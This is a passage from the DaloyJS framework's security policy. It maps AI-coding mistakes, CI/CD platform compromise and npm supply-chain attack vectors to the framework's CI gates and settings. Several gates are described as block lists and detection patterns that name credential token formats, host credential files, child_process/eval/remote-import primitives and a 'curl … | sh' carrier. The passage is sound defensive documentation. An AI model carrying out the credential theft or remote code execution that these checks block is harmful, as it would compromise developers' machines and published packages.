  does **not** defend (network DoS, insecure handler code, integrated
  template engines, credential storage, TLS termination, runtime
  compromise), so operators who deploy DaloyJS can place the right controls
  at the right layer instead of assuming an "AI shield" exists where it
  does not.

If you find a class of bug that an AI-augmented attacker would obviously
try and that core does not already refuse, please report it via the
private-disclosure channel above. The framework's posture is to add the
check to core and the CI gate, not to add a runtime classifier.

### AI-assisted developers (Windsurf / Devin / Cursor / Copilot / Claude Code)

The mirror of the "AI on the attacker side" threat above is "AI on the
**developer** side": an LLM-backed IDE or autonomous agent writes the code
that ends up in production. Aikido and Windsurf's joint write-up
["Security-Conscious AI Software Development with Windsurf x Aikido"](https://www.aikido.dev/blog/security-ai-development-windsurf-aikido)
catalogs the concrete failure modes operators worry about: test API keys
committed inside a config file, a Dockerfile that quietly exposes broad
network access in staging, an AI-scaffolded route reaching production
without an auth check, AI-suggested raw-SQL / shell-call / weak-input-
validation logic, AI-pulled vulnerable open-source dependencies, AI-generated
IaC that bypasses review, and undocumented or unintentionally-public APIs.

Daloy is a backend HTTP framework, so the application-code half of that list
is ultimately the handler author's responsibility — but the framework and the
`create-daloy` templates are deliberately shaped so the most-likely AI
mistakes either cannot land in `@daloyjs/core` itself or are caught by the
same first-party gates an Aikido-style platform would run from the outside.

| AI-coding failure mode (article) | DaloyJS / template control |
| --- | --- |
| **Test API keys / `.env` files / private keys committed via an AI commit** | The three-layer leaked-credentials gate `pnpm verify:no-leaked-credentials` (run in CI **and** in both publish jobs of [`release.yml`](.github/workflows/release.yml)) is the same kind of secret-scanning check Aikido runs on commits — see the "Leaked credentials in the published tarball" row above for the exact filename + content patterns refused (AWS `AKIA…`, GitHub PATs, npm `npm_…`, Slack `xox?-…`, Stripe `sk_live_…`, Google `AIza…`, JWT-shaped strings, PEM private-key blocks, `_authToken=` lines). Every scaffolded template ships a [`_gitignore`](packages/create-daloy/templates/node-basic/_gitignore) that excludes `.env`, `.env.*` (with a `!.env.example` allowlist), `dist/`, `coverage/`, and `*.log`, so a Windsurf / Cursor / Copilot / Claude Code suggestion to "commit my local `.env` for convenience" never reaches the repo, and even if it did the publish-side gate refuses the tarball. Defense-in-depth: the daily `gitleaks` job ([`.github/workflows/secret-scan.yml`](.github/workflows/secret-scan.yml)) re-scans every push and PR. |
| **AI-scaffolded route reaches production without an auth check** | Authentication in Daloy is **always explicit** — there is no implicit "scaffold a route, get auth for free" surface for an AI to forget to attach. Routes are declared via `app.route({ method, path, handler })`; auth is a `beforeHandle` (per route or per `app.group()`) using a first-party primitive (`bearerAuth`, `basicAuth`, `jwt()`, signed-cookie `session()`). Three follow-on checks make a forgotten auth attachment hard to ship: (a) `app.introspect()` and the generated OpenAPI 3.1 spec list every route plus its `security: …` annotation, so a reviewer (or a CI script) can grep for routes with no security requirement before merge; (b) `responses[N].body` schemas validate on the way out, so a handler that accidentally serializes a privileged field doesn't pass the framework boundary; (c) the `except()` matcher consumes the same `url.pathname` the router sees (Qinglong CVE-2026-3965 / CVE-2026-4047 row), so an AI-suggested rewrite-shaped path cannot skip auth and still reach a protected handler. The DAST job ([`.github/workflows/dast.yml`](.github/workflows/dast.yml)) runs OWASP ZAP baseline against the bookstore example weekly, which catches an unauthenticated route reaching the example app end-to-end. |
| **AI suggests raw SQL / shell call / weak input validation** | Input validation is contract-first by construction: `request.body` / `request.query` / `request.params` are validated by Standard Schema (Zod 4 / Valibot / ArkType / TypeBox) **before** the handler runs, and the three non-JSON parsers (`queryToObject`, urlencoded, multipart) funnel keys through `isForbiddenObjectKey` from [`src/security.ts`](src/security.ts) to drop `__proto__` / `constructor` / `prototype` (Spring4Shell row). An AI-suggested handler that skips validation has to actively delete a schema rather than forget to add one. **In core itself**, `pnpm verify:no-remote-exec` refuses `node:child_process` / `child_process` / `vm` / bare `eval(…)` / `new Function(…)` / dynamic `import("http(s)://…")` in `src/**`, so an AI suggestion to "just shell out for this" cannot land in the framework. Raw-SQL in user handlers is the application's responsibility (Daloy ships no ORM), but the docs page [`/docs/security/owasp-api-top-10`](website/app/docs/security/owasp-api-top-10/page.tsx) and the website's [Prisma docs](website/app/docs/orm/prisma/page.tsx) point handler authors at parameterized queries rather than string concatenation. |
| **AI pulls a vulnerable / typosquatted / freshly-published-malicious open-source dependency** | `@daloyjs/core` declares **zero** runtime dependencies (enforced by `pnpm verify:no-runtime-deps`), so an AI suggestion to "just add `axios` here" cannot land in core. Across the whole repo, the supply-chain hardening below applies: `ignore-scripts=true` blocks install-time payloads, `minimum-release-age=1440` (24 h) keeps consumers off the freshly-published-trojan hot path, `frozen-lockfile=true` + `verify-store-integrity=true` + [`pnpm verify:lockfile-sources`](scripts/verify-lockfile-sources.ts) refuse non-`registry.npmjs.org` sources and the documented Lazarus / RATatouille / `node-ipc` typosquats, the daily [`vuln-scan.yml`](.github/workflows/vuln-scan.yml) runs `pnpm audit --prod` against the committed lockfile, and `pnpm verify:dep-licenses` rejects licenses outside the SPDX allowlist. Every `packages/create-daloy/templates/*/_npmrc` ships the same posture so a scaffolded app inherits it. |
| **AI-generated Dockerfile or IaC quietly exposes broad network access** | Container / Kubernetes / Terraform / Pulumi posture is below the framework layer, but `create-daloy` deliberately does **not** scaffold a `Dockerfile`, `docker-compose.yml`, `k8s/`, `terraform/`, or `cdk/` directory — there is no AI-suggested-IaC surface to misconfigure in the scaffold. For containerized deploys, the recommended posture in [`SECURITY.md`](SECURITY.md) and [`website/app/docs/security`](website/app/docs/security) is to layer a CSPM tool (Aikido, Wiz, Orca, …) on top, exactly as the Aikido x Windsurf article recommends; the framework's contribution is to expose narrow defaults at the process layer (body cap, request timeout, `secureHeaders()`, `fetchGuard()` default-denying SSRF against cloud-metadata IPs) so a permissive network policy at the container layer still meets a default-deny check at the request boundary. |
| **AI-suggested change weakens a built-in security primitive** (e.g. drops a header sanitizer, downgrades the JWT algorithm allowlist, removes a rate-limit guard, replaces `timingSafeEqual` with `===`) | Caught at PR review plus static governance gates: `pnpm verify:parity-audits`, `pnpm verify:governance-audits`, `pnpm verify:runtime-parity-audits`, `pnpm verify:routing-hardening-audits`, and `pnpm verify:secret-comparisons` enforce the documented security floor, and CODEOWNERS protects sensitive paths (`src/security.ts`, `src/hashing.ts`, `src/jwt.ts`, the `.github/` directory). A `===` substitution against any header-derived value in `src/**` is rejected by CI before merge (see the "Credential timing attacks" row above), and a removed lifecycle-script / actions-pinning / `persist-credentials: false` setting is rejected by `verify-governance-audits`. This is the same posture documented in the ToxicSkills row below for poisoned AI-agent skills. |
| **Undocumented or unintentionally-public API surface** (API9 in the OWASP API Top 10) | OpenAPI 3.1 is generated from the same `app.route({...})` definition that runs in production — there is no separate hand-maintained spec for an AI-suggested route to drift away from. `pnpm gen` emits the Hey API typed SDK from that spec; `app.introspect()` is a public API for runtime discovery of every registered route (method, path, tags, deprecation, security requirements). A "shadow" v1/v2 endpoint suggested by an AI cannot exist without appearing in the spec, the docs UI, the typed client, and `introspect()` — see the API9 entry in the OWASP API Security Top 10 row above. |

**What the framework explicitly cannot do, and we say so:** Daloy cannot
stop an application author from accepting an AI-suggested change that, e.g.,
returns a user's password hash in a `GET /users/:id` response, hard-codes a
production API key into an env-var default, or wires an LLM call to a
`prompt = req.body.userInput` string with no validation. Those are
application-level mistakes and the same posture the Aikido x Windsurf
article describes applies — pair the framework with an external code-scanning
service (Aikido, Snyk, Socket, GitHub Advanced Security, …) for the
application-code half, and treat every AI-authored PR as a PR to review
rather than auto-merge. CODEOWNERS, branch protection, the `npm-publish`
GitHub Environment second-approver requirement, and the per-template
`_gitignore` exclusions are the framework-side primitives that keep the
blast radius of an over-eager AI suggestion bounded.

### Hardening roadmap (tracked, not yet shipped)

These improvements are on the security roadmap. They are listed publicly so
operators can plan around them and contributors can pick them up. Items that
have shipped are kept here briefly with a `(shipped)` marker so the history
remains auditable.

- **First-party JWT verification** — `createJwtVerifier` / `createJwtSigner`
  with a mandatory algorithm allowlist (no `none`, no `alg` from header),
  configurable `issuer`/`audience`/`clockTolerance`, and first-party JWKS
  resolution via `jwk()`. **(shipped)**
- **Under-pressure auto-shedding** in the Node adapter (event-loop lag, RSS,
  heap), returning `503` before the runtime hangs. Exposed as `loadShedding()`
  with the `LOAD_SHEDDING_MARKER` integration hook. **(shipped)**
- **First-party WebAuthn / passkeys** via a thin wrapper over a vetted library.
- **Per-route capability-based body limits** derived from the route schema
  (override the global cap when the schema implies a tighter ceiling).
- **SLSA build-level-3 attestations** beyond the existing npm provenance attestation, and **CycloneDX 1.5 + SPDX 2.3 SBOM** published in every `@daloyjs/core` and `create-daloy` tarball (`dist/sbom.cdx.json`, `dist/sbom.spdx.json`, generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and locked at release time by [`pnpm verify:sbom`](scripts/verify-sbom.ts)). **(SBOM shipped 0.34.0; SLSA L3 still tracked)**
- **`npm audit signatures`** (or equivalent registry-signature verification)
  enforced in CI for every install.
- **Continuous fuzzing** of the JSON parser, header sanitizers, router, and
  multipart parser via Jazzer.js + OSS-Fuzz.
- **Third-party audit** of the core once the public API stabilizes around
  `1.0`, with the report linked from this file.
- **Public bug bounty** through huntr.dev (or equivalent) once the audit ships.

---

## Supply-chain security (how DaloyJS is built and published)

We treat the package supply chain as an attack surface. The controls below are
specifically designed against the patterns documented in
[`otherdocs/security-incidence.md`](otherdocs/security-incidence.md), most
recently the TanStack 2026-05-11 worm
([postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem),
[follow-up](https://tanstack.com/blog/incident-followup)) and the
chalk/debug/node-ipc phishing campaigns.

### CI/CD

- **No `pull_request_target` anywhere in the repo.** Fork PRs run with the
  default `pull_request` trigger and have no access to repo secrets, the GitHub
  Actions cache scope shared with `main`, or any token capable of publishing.
- **Top-level `permissions: {}`** in every workflow; jobs opt in to the
  minimum scopes they need.
- **`actions/checkout` runs with `persist-credentials: false`** so the workflow
  token is not left on disk for later steps to scrape.
- **Third-party GitHub Actions are SHA-pinned.** Workflows execute immutable
  commits instead of mutable version tags, which removes the retagging class of
  supply-chain attack from CI. The `verify:actions-pinned` gate
  ([`scripts/verify-actions-pinned.ts`](scripts/verify-actions-pinned.ts))
  refuses any workflow `uses:` line that is not a 40-character lowercase
  hex commit SHA, that interpolates a `${{ … }}` expression, or that
  references a known-compromised action (currently `tj-actions/changed-files`
  per [CVE-2025-30066](https://nvd.nist.gov/vuln/detail/CVE-2025-30066) and
  `reviewdog/action-setup` per CVE-2025-30154, both documented in Socket's
  [tj-actions write-up](https://socket.dev/blog/github-actions-supply-chain-attack-puts-thousands-of-projects-at-risk)).
- **`step-security/harden-runner`** monitors and (on the publish job) blocks
  egress to anything other than the npm registry, GitHub, and the Sigstore
  endpoints needed for provenance.
- **No GitHub Actions cache** in the standard CI workflow. Cache scope is
  shared between fork PRs and pushes to `main`, which is the cache-poisoning
  vector that bridged TanStack's PR pipeline into its release pipeline.
- **`zizmor`** statically analyses every workflow on every PR
  (`.github/workflows/zizmor.yml`).
- **CodeQL** runs JavaScript/TypeScript and `actions` queries
  (`.github/workflows/codeql.yml`).
- **Opengrep** runs a second SAST engine (Aikido's LGPL-2.1 fork of
  Semgrep) against `src/`, `scripts/`, `examples/`, `bin/`, `tests/`,
  and `packages/` with the `p/security-audit`, `p/owasp-top-ten`,
  `p/cwe-top-25`, `p/javascript`, `p/typescript`, `p/nodejs`, and
  `p/secrets` rule packs (`.github/workflows/opengrep.yml`). The
  Opengrep binary is downloaded from a pinned GitHub release and its
  sigstore cosign signature is verified against the official
  `opengrep/opengrep` release identity before execution, so the trust
  surface is the cosign keyless identity rather than a third-party
  Action. Running two SAST engines (CodeQL + Opengrep) catches
  different bug classes — the same defense-in-depth rationale that
  pairs SAST with DAST (`.github/workflows/dast.yml`). See Aikido's
  ["Launching Opengrep: Why We Forked Semgrep"](https://www.aikido.dev/blog/launching-opengrep-why-we-forked-semgrep)
  for the engine's provenance.
- **OpenSSF Scorecard** publishes a continuous scorecard
  (`.github/workflows/scorecard.yml`).
- **Daily SCA** runs `pnpm audit --prod` against the committed lockfile on a
  fixed schedule, independent of PR/push activity, so newly-disclosed CVEs in
  pinned dependencies are surfaced even on quiet days
  (`.github/workflows/vuln-scan.yml`). This is the continuous-scanning
  cadence required by SOC 2 CC7.1 and described in the Aikido write-up
  ["A Guide to Automating Technical Vulnerability Management for SOC 2"](https://www.aikido.dev/blog/a-guide-to-automating-technical-vulnerability-management-for-soc-2).
- **`gitleaks` secret scan** runs on every PR and push against the
  working tree, plus a daily sweep of the full git history
  (`.github/workflows/secret-scan.yml`). The gitleaks binary is
  downloaded from the official GitHub release and verified by SHA-256
  before execution, so the trust surface is a pinned hash rather than a
  third-party Action. This is the pre-merge secret-detection gate
  recommended by the Aikido write-up
  ["Continuous Code Quality in CI/CD Pipelines"](https://www.aikido.dev/blog/continuous-code-quality-ci-cd)
  and layers on top of GitHub-native push protection + the existing
  `verify:no-leaked-credentials` tarball gate.
- **Dependabot** keeps actions and npm dependencies up to date weekly
  (`.github/dependabot.yml`).
- **`CODEOWNERS`** requires a maintainer to approve any change under
  `.github/`, `package.json`, the lockfile, or `.npmrc`.

### CI/CD platform compromise (Aikido "prevent fallout" mapping)

A CI/CD provider being breached is treated as an in-scope threat for the
framework's own publishing pipeline. The Aikido write-up
["Preventing fallout from your CI/CD platform being hacked"](https://www.aikido.dev/blog/prevent-fallout-when-cicd-platform-hacked)
enumerates the controls that contain the blast radius when the CI/CD provider
itself (or a transitively compromised action) is the attacker. Daloy's
existing controls map 1:1:

| Aikido recommendation | DaloyJS control |
| --- | --- |
| **Restrict the credentials the CI runner can mint** (don't hand a long-lived cloud admin role to every pipeline; restrict by IP / OIDC subject claim) | No long-lived `NPM_TOKEN` is stored anywhere in the repo or GitHub org. Publishing uses **npm Trusted Publishing (OIDC)** with `id-token: write` granted **only** on the two publish jobs in [`.github/workflows/release.yml`](.github/workflows/release.yml), **only after** the protected `npm-publish` GitHub Environment requires explicit maintainer approval. Maintainers should pin the npm Trusted Publishing configuration on the registry side to the specific workflow filename (`release.yml`) and ref pattern (`refs/tags/v*`) so that a stolen OIDC token from any other workflow cannot publish. |
| **Minimal access / split accounts** (no shared admin; least privilege per job) | Top-level `permissions: {}` in every workflow; jobs opt in to `contents: read` only; `id-token: write` lives on the publish job alone. Core and CLI are split into two separate publish jobs so a compromise of one job cannot republish the other. |
| **SSO / MFA on the CI/CD platform and the registry** | Hardware-backed 2FA is **mandatory** on both GitHub org membership and npm publish accounts (see [Maintainer accounts](#maintainer-accounts)). The `npm-publish` GitHub Environment requires a separate maintainer approval click for every publish, and that approver is gated by the SECURITY-CONTACTS active rotation check inside `release.yml`. |
| **Automate security checks at every stage of the pipeline** | The `verify` job in [`release.yml`](.github/workflows/release.yml) runs **before** the publish jobs and gates them on: `verify:lockfile`, `verify:no-runtime-deps`, `verify:no-lifecycle-scripts`, `verify:no-bin-shadowing`, `verify:secret-comparisons`, `verify:no-unsafe-buffer`, `verify:no-remote-exec`, `verify:actions-pinned`, `verify:parity-audits` through `verify:routing-hardening-audits`, `typecheck`, `test`, `coverage`, `coverage:branches`, `build`, `verify:no-leaked-credentials`, `verify:no-invisible-unicode`, and `pnpm audit --prod`. The same gates run on every PR and every push to `main` via [`ci.yml`](.github/workflows/ci.yml), plus `zizmor`, CodeQL, and OpenSSF Scorecard out-of-band. |
| **Protect against malware in the package manager** (Aikido Safe Chain class: malicious npm/pnpm/pip packages installed during build) | Defense-in-depth: (a) the published package has **zero runtime dependencies** (`verify:no-runtime-deps`) so consumers of `@daloyjs/core` carry no transitive risk; (b) `ignore-scripts=true` in both root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` blocks `postinstall` / `preinstall` malware on every machine that installs Daloy or anything Daloy scaffolds; (c) `minimum-release-age=1440` (24 h) in the same `.npmrc` files refuses to install any dependency that was published less than a day ago, which is the window in which freshly-published worm versions (Shai-Hulud, BlokTrooper, the TanStack 2026-05-11 worm) are typically yanked; (d) `verify:no-remote-exec` refuses any `src/**` file that imports `child_process` / `vm`, calls bare `eval`, constructs `new Function` from a string, or dynamically imports a remote URL, so a compromised dev dependency cannot land a `curl … \| sh` carrier inside Daloy itself; (e) `verify:no-leaked-credentials` and `verify:no-invisible-unicode` run on the assembled tarball **inside** the publish job after `pnpm build`, so a GlassWorm-class worm that injected a payload during install would still be caught before `pnpm publish`. |
| **Egress-restrict the runner so a compromised step cannot exfiltrate** | The two publish jobs run `step-security/harden-runner` with `egress-policy: block` and an explicit allowlist of `registry.npmjs.org`, `api.github.com`, `github.com`, `objects.githubusercontent.com`, and the three Sigstore endpoints. Anything else — Session/Oxen, attacker C2, the npm metadata-abuse endpoints used by TanStack-class worms — is dropped at the runner. The `verify` job and the CI workflow run in `audit` mode so unexpected egress is recorded for review. |
| **No shared cache / cold installs on publish** | The publish workflow uses no GitHub Actions cache. The CI workflow likewise has the pnpm cache disabled; cache scope is shared between fork PRs and pushes to `main`, which is the exact bridge the TanStack 2026-05-11 worm used to reach the release pipeline. |
| **Audit who approved each release** | Every publish run records the GitHub actor and the `npm-publish` Environment approver. The release script refuses to publish if `github.actor` is not in the `<!-- BEGIN ACTIVE -->` block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md). |

If GitHub Actions itself is breached at the platform level, the worst-case
exposure for a Daloy release is: an attacker who has bypassed both `harden-runner`'s
egress block **and** the `npm-publish` Environment approval **and** GitHub's
OIDC issuer would still produce a tarball that carries a valid Sigstore
provenance attestation bound to the malicious workflow run — visible publicly
on the npm package page and on the Rekor transparency log, and rejectable by
consumer-side OIDC subject-claim policies. That is the residual risk; we
deliberately accept it in exchange for not running a self-hosted publish
runner (which has its own larger threat model).

### Socket "Inside your `node_modules`" attack-vector mapping

Socket's canonical 2022 write-up
["What's Really Going On Inside Your node_modules Folder?"](https://socket.dev/blog/inside-node-modules)
enumerates the six attack vectors that account for the overwhelming majority
of npm supply-chain incidents (typosquatting, dependency confusion, hijacked
packages, install scripts, permission creep, and obfuscation). DaloyJS's
defense for each, both for the framework itself and for anyone who installs
`@daloyjs/core` / scaffolds with `create-daloy`, maps as follows:

| Socket attack vector | DaloyJS control |
| --- | --- |
| **Typosquatting** (an attacker publishes a near-identical name to a popular package) | The framework publishes under the scoped name `@daloyjs/core` and the scaffolder under `create-daloy`. `@daloyjs/core` declares **zero runtime dependencies** (`pnpm verify:no-runtime-deps`), so an application that uses Daloy carries no transitive `npm install` surface that a typo can land on through us. Scaffolded templates pin every dependency in a committed `pnpm-lock.yaml` and ship a `_npmrc` with `minimum-release-age=1440`, so even a typo-squatted package in a template would need to survive 24 h on the registry before any consumer install resolves it. The `verify:no-bin-shadowing` gate ([`scripts/verify-no-bin-shadowing.ts`](scripts/verify-no-bin-shadowing.ts)) closes the related "bin-script confusion" typosquat class flagged by [Socket](https://socket.dev/blog/npm-bin-script-confusion). |
| **Dependency confusion** (an attacker registers an unclaimed internal package name on the public registry) | All Daloy-published names are scoped under `@daloyjs/*` or the registered unscoped name `create-daloy`. The root [`.npmrc`](.npmrc) pins `registry=https://registry.npmjs.org/`, and `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) refuses any lockfile entry resolved from a non-registry source (`git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, or any tarball URL outside `registry.npmjs.org`). Consumers who scaffold with `create-daloy` inherit the same `.npmrc` posture. |
| **Hijacked packages** (a maintainer account or a published package gets taken over and a poisoned version is pushed) | Defense-in-depth: (a) **no long-lived `NPM_TOKEN`** anywhere; publishing uses npm Trusted Publishing (OIDC) with `id-token: write` only on the two publish jobs in [`.github/workflows/release.yml`](.github/workflows/release.yml); (b) hardware-backed 2FA is **mandatory** on the npm publish account and GitHub org; (c) the `npm-publish` GitHub Environment requires a separate maintainer approval click per publish, gated on the active rotation in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md); (d) every published tarball carries an `npm provenance` Sigstore attestation bound to the workflow run; (e) the **24 h release-age cooldown** (`minimum-release-age=1440` in both the root `.npmrc` and every scaffolded template `_npmrc`) means a poisoned republish of any dependency cannot land on a consumer's machine inside the window where these worms are typically detected and yanked (TanStack 2026-05-11, Shai-Hulud, chalk/debug, node-ipc all fell inside that window). |
| **Install scripts** (`preinstall` / `install` / `postinstall` / `prepare` hooks running attacker code on `npm install`) | **`ignore-scripts=true`** is set in the root [`.npmrc`](.npmrc) **and** in every scaffolded template `_npmrc`, so no transitive package's lifecycle hooks ever run on Daloy maintainers' machines, on Daloy CI, or on any application a developer scaffolds with `create-daloy`. The explicit `onlyBuiltDependencies` allowlist in `package.json` is the documented exception. `pnpm verify:no-lifecycle-scripts` ([`scripts/verify-no-lifecycle-scripts.ts`](scripts/verify-no-lifecycle-scripts.ts)) further refuses any forbidden lifecycle hook (`preinstall`, `install`, `postinstall`, `prepare`, `preprepare`, `postprepare`, `prepublish`) in the published `package.json` of `@daloyjs/core` or `create-daloy`, so a poisoned tarball cannot ship a hook even if a maintainer typo'd one in. |
| **Permission creep** (a previously well-behaved package starts using `child_process`, `vm`, `fetch`, env vars, or the filesystem to land or exfiltrate a payload) | `pnpm verify:no-remote-exec` ([`scripts/verify-no-remote-exec.ts`](scripts/verify-no-remote-exec.ts)) refuses any file under `src/**` that imports `node:child_process` / `child_process`, imports `node:vm` / `vm`, calls bare `eval(...)`, constructs `new Function(...)` from a string, or dynamically `import("https://...")` of remote code — the exact primitives a permission-creep payload needs. `pnpm verify:no-registry-exfiltration` ([`scripts/verify-no-registry-exfiltration.ts`](scripts/verify-no-registry-exfiltration.ts)) refuses TLS-verification bypass (`rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED` mutation), `process.env.HOME` mutation, references to host credential files (`~/.npmrc`, `~/.netrc`, `~/.gem/credentials`, `~/.yarnrc[.yml]`), and string literals naming registry publish endpoints. `pnpm verify:no-vulnerable-sandboxes` blocks `vm2`/`safe-eval`/`notevil`/`static-eval`/`eval-sandbox`/`vm2-sandbox-escape` from entering as a direct dep or via the lockfile. `pnpm verify:no-unsafe-buffer` blocks the legacy `Buffer` API that an attacker could use to ship uninitialized memory through a response. |
| **Obfuscation** (the code on npm is heavily mangled, or differs from what's on GitHub, to hide the payload from review) | `pnpm verify:no-invisible-unicode` ([`scripts/verify-no-invisible-unicode.ts`](scripts/verify-no-invisible-unicode.ts)) scans every file in the publishable tarball **and** every in-repo source root and refuses to publish if any file contains Unicode Tag characters (the GlassWorm carrier), zero-width / word-joiner characters mid-stream, bidi-override controls (Trojan Source), Private Use Area code points, or a mid-file BOM — the carriers attackers use to hide payloads from reviewer eyes and diff viewers. Combined with `verify:no-leaked-credentials` (which scans the assembled tarball for AWS / GitHub / npm / Slack / Stripe / Google / JWT / PEM / `_authToken=` patterns) the gate runs **after** `pnpm build` inside the publish job, so a compromised dev-time tool that injected obfuscated code into `dist/` would still be caught before `pnpm publish`. The published tarball is also restricted by `package.json#files` to `dist/` + `bin/` + `README.md`, and every release carries `npm provenance` Sigstore metadata so the published artifact is bound to the public workflow run that produced it — closing the "code on npm differs from GitHub" gap. |

The net effect for someone running `pnpm install @daloyjs/core` or
`pnpm create daloy`: zero transitive runtime dependencies, no lifecycle hooks
on install (locally or transitively), a 24 h cooldown on freshly published
versions of anything that does come in via templates, and source provenance
on every release. The framework cannot stop a downstream application from
installing a typosquat of some **other** package, but it does not contribute
attack surface of its own and the scaffolded template inherits the same
posture.

### Socket "vulnerability scanning isn't enough" mapping (unknown-vuln / malicious-package class)

Socket's 2022 write-up
["Why Vulnerability Scanning Isn't Enough To Protect Your App"](https://socket.dev/blog/vuln-scanning-is-not-enough)
argues that CVE / NVD-style scanners only catch **known** vulnerabilities and
cannot stop an attacker who hijacks a package, ships obfuscated code, drops a
`preinstall` hook, or republishes after a long dormancy — using the November
2021 `coa` hijack as the canonical example (long-dormant package suddenly
re-published with `preinstall` + obfuscated code that stole credentials).
DaloyJS's daily `pnpm audit --prod` ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml))
is the known-vuln baseline; the controls below are the framework's answer to
each unknown-vuln signal the article calls out, so operators get explicit
traceability rather than guessing.

| Signal Socket flags (unknown vulns / malicious packages) | DaloyJS control |
| --- | --- |
| **Lifecycle hooks running attacker code on install** (`preinstall` / `install` / `postinstall` / `prepare`, the carrier in the `coa` hijack) | `ignore-scripts=true` in the root [`.npmrc`](.npmrc) **and** in every scaffolded template `_npmrc` blocks every transitive lifecycle hook on Daloy CI, maintainer machines, and any application scaffolded with `create-daloy`. `pnpm verify:no-lifecycle-scripts` ([`scripts/verify-no-lifecycle-scripts.ts`](scripts/verify-no-lifecycle-scripts.ts)) refuses any forbidden hook in the published manifest of `@daloyjs/core` or `create-daloy` itself. The explicit `onlyBuiltDependencies` allowlist in [`package.json`](package.json) is the only sanctioned exception. |
| **Sudden republish after long dormancy** (the `coa` pattern: years of quiet, then a malicious version pushed to a popular package) | `minimum-release-age=1440` (24 h) in the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` refuses to install any dependency that was published less than a day ago, which is the window in which freshly-published worm versions (Shai-Hulud, BlokTrooper, TanStack 2026-05-11) are typically detected and yanked. A surprise republish therefore cannot reach a Daloy CI run or a consumer install inside the high-risk window. |
| **Obfuscated code / code on npm differs from GitHub** (the article's "addition of obfuscated code" signal) | `pnpm verify:no-invisible-unicode` refuses Unicode-Tag, zero-width, bidi-override, Private-Use-Area, and mid-file BOM carriers in every published file and every in-repo source root. `pnpm verify:no-remote-exec` refuses `eval(...)`, `new Function(...)` from a string, dynamic remote `import("https://...")`, and `child_process` / `vm` imports in `src/**` — the primitives an obfuscated payload needs to land. `package.json#files` whitelists the tarball to `dist/` + `bin/` + `README.md`, and every tarball ships `npm provenance` (Sigstore + OIDC) bound to the public `release.yml` workflow run, closing the "npm bytes ≠ GitHub bytes" gap. |
| **Reviewing the entire open-source supply chain** (the article's "review all dependencies, not just direct ones") | `@daloyjs/core` declares **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)). There is no transitive runtime tree to review. Adapter bindings are `peerDependencies` chosen by the consumer. The dev/test tree is pinned in [`pnpm-lock.yaml`](pnpm-lock.yaml) and [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) refuses any entry resolved from a non-registry source. |
| **Researching maintainers, update cadence, and security practices** (the article's "evolve security reviews as new cracks emerge") | Active release authors are listed in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml) refuses to publish unless the GitHub actor is in the **Active** block. Every release tag and release commit is signed. Mandatory hardware-backed 2FA is enforced at both the GitHub org level and the npm registry level (§ Maintainer accounts). The recurring quarterly disclosure exercise (above) re-verifies the private-report inbox, the active rotation, and the `npm-publish` Environment so a stale handoff fails CI loud. |
| **Continuous review of unchanged code as new vulns are disclosed** (the article's "continuously check existing, unchanged code") | The daily SCA workflow ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml)) runs `pnpm audit --prod` against the committed lockfile on a fixed schedule (06:13 UTC), independent of PR/push activity, so newly-disclosed CVEs in pinned dependencies are surfaced even on quiet days. OpenSSF Scorecard publishes a continuous score ([`.github/workflows/scorecard.yml`](.github/workflows/scorecard.yml)) and CodeQL re-scans on schedule ([`.github/workflows/codeql.yml`](.github/workflows/codeql.yml)). |
| **The "overconfidence" failure mode the article warns about** (a green vuln scan ≠ secure) | This file documents what core does **not** defend (§ Explicitly out of scope and § AI-accelerated attackers) so operators do not treat a green `pnpm audit` as a complete posture. Network DoS, insecure handler code, integrated template engines, credential storage, TLS termination, and runtime compromise are called out as operator responsibilities, with the recommended layer for each. |

What this **does not** defend against, and we say so explicitly:

- A malicious package landing in the consumer's *application* dependency
  tree, outside of `@daloyjs/core` and `create-daloy`. Consumers should
  layer their own Socket / Aikido / Snyk lookup on the rest of their tree
  — Daloy's zero-runtime-deps + scaffolded `ignore-scripts` + 24 h
  cooldown shrinks the framework's contribution to that tree to zero, but
  cannot police what else the consumer installs.
- An attacker who compromises a Daloy *dev* dependency, gets past the 24 h
  cooldown, and ships a payload that only fires under Daloy's CI runner
  identity. The publish job's `step-security/harden-runner` egress block,
  the `verify:no-leaked-credentials` and `verify:no-invisible-unicode`
  gates that run on the assembled tarball **after** `pnpm build`, and the
  `npm-publish` Environment approval together shrink the blast radius, but
  the residual risk is non-zero and is the reason the Hardening roadmap
  lists `npm audit signatures` and SLSA build-level-3 attestations as
  planned work (the CycloneDX 1.5 + SPDX 2.3 SBOM leg shipped in
  `0.34.0` — see [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts)
  and [`scripts/verify-sbom.ts`](scripts/verify-sbom.ts)).

### Socket "limitations of CVE-based scanners" mapping (no-CVE supply-chain class)

Socket's 2023 write-up
["Limitations of CVE-Based Security Scanners: A Deep Dive into 3 Notable Supply
Chain Attacks"](https://socket.dev/blog/limitations-of-cve-based-security-scanners)
makes the case that NVD/CVE-style scanners are structurally blind to three
canonical npm incidents because none of them had a CVE at the time of impact:
**`ua-parser-js`** (hijacked maintainer account, `preinstall` hook that fetched
and ran an XMRig miner + credential stealer), **`event-source-polyfill`**
(protestware — a maintainer-introduced runtime behavioral change targeting
users in specific time zones, still live on npm), and **`event-stream`** (the
original maintainer handed the package to a new "maintainer" who added a
heavily obfuscated payload that stole Bitcoin-wallet credentials from a
downstream dependent). Each one would have passed a green `pnpm audit` at the
moment of compromise. DaloyJS's daily `pnpm audit --prod`
([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml)) is the
known-CVE baseline; the controls below are the framework's answer to each
